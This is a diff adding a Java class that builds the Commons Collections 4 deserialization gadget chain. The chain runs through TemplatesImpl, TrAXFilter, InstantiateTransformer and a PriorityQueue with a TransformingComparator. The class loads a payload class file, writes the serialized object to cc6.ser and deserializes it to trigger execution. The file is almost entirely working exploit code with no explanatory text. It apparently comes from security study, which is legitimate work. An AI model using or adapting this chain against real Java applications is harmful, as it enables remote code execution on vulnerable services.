@@ -1,0 +1,63 @@
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CC4PriorityQueue {
+    public static void main(String[] args) throws Exception {
+        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
+        TemplatesImpl templatesClass = new TemplatesImpl();
+        Field[] fields = templatesClass.getClass().getDeclaredFields();
+        for (Field field : fields) {
+            field.setAccessible(true);
+            if (field.getName().equals("_bytecodes")) {
+                field.set(templatesClass, new byte[][]{code1});
+            } else if (field.getName().equals("_name")) {
+                field.set(templatesClass, "godown");
+            } else if (field.getName().equals("_tfactory")) {
+                field.set(templatesClass, new TransformerFactoryImpl());
+            }
+        }
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesClass}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer,null);
+        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
+        priorityQueue.add(1);
+        priorityQueue.add(2);
+        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
+        compareField.setAccessible(true);
+        compareField.set(priorityQueue,transformingComparator);
+        serialize(priorityQueue);
+        unserialize("cc6.ser");
+    }
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static Object unserialize(String filename) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
